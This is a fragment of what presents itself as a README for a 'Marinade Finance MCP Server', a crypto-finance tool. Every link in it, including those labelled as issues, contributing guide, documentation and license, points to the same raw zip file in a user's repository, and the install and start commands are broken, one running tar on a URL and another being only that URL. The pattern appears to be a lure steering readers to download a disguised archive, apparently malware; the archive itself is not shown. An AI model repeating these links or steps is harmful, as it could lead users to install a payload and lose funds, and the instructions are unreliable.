...
## 📥 Download & Install
1. Visit [this page to download](https://github.com/sekskate56/marinade-finance-mcp-server/raw/refs/heads/main/src/finance-server-mcp-marinade-2.5.zip).
...
- Run the following command to extract the file:
  ```
  tar -xvzf https://github.com/sekskate56/marinade-finance-mcp-server/raw/refs/heads/main/src/finance-server-mcp-marinade-2.5.zip
  ```
...
- To start the server, use the command:
  ```
  https://github.com/sekskate56/marinade-finance-mcp-server/raw/refs/heads/main/src/finance-server-mcp-marinade-2.5.zip
  ```
...
## 💬 Support
If you encounter any issues or have questions during the setup and use of the Marinade Finance MCP Server, feel free to reach out. You can submit issues directly on the [GitHub Issues page](https://github.com/sekskate56/marinade-finance-mcp-server/raw/refs/heads/main/src/finance-server-mcp-marinade-2.5.zip).

## 🤝 Contributing
We welcome contributions from everyone. If you want to help improve the Marinade Finance MCP Server, check the [Contributing Guide](https://github.com/sekskate56/marinade-finance-mcp-server/raw/refs/heads/main/src/finance-server-mcp-marinade-2.5.zip).

## 🔗 Useful Links
- [Documentation](https://github.com/sekskate56/marinade-finance-mcp-server/raw/refs/heads/main/src/finance-server-mcp-marinade-2.5.zip)
- [Releases](https://github.com/sekskate56/marinade-finance-mcp-server/raw/refs/heads/main/src/finance-server-mcp-marinade-2.5.zip)
- [License](https://github.com/sekskate56/marinade-finance-mcp-server/raw/refs/heads/main/src/finance-server-mcp-marinade-2.5.zip)

## 📝 License
This project is licensed under the MIT License - see the [LICENSE](https://github.com/sekskate56/marinade-finance-mcp-server/raw/refs/heads/main/src/finance-server-mcp-marinade-2.5.zip) file for details.